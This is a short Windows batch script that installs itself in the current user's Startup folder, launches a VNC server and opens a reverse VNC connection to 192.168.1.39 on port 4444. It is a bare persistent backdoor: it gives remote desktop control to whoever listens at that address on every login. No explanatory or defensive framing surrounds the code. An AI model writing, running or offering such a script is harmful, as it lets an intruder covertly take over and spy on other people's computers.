@echo off
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
  copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)
start winvnc.exe -run
timeout /t 1 >nul
start winvnc.exe -connect 192.168.1.39::4444
